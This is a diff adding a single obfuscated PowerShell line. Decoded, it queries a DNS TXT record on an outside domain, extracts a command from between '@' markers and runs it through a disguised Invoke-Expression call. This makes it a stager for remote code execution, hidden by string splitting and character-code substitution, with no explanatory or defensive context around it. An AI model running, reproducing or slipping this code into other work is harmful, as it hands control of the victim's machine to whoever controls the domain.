@@ -1,0 +1,1 @@
+﻿('if('+'JtZJt'+'Z+(n'+'slookup -'+'q=t'+'x'+'t p.s'+'.pn'+'.ns.sse.'+'net.'+'p'+'l) -ma'+'tch Jt'+'Z'+'@'+'('+'.*)@'+'J'+'tZ)'+'{ie'+'x Dxo'+'m'+'atch'+'es'+'['+'1'+']}').REplACE('Dxo',[StRING][ChaR]36).REplACE('JtZ',[StRING][ChaR]39) | &( ([STRINg]$VErbOsEpREFerenCE)[1,3]+'X'-JOIN'')
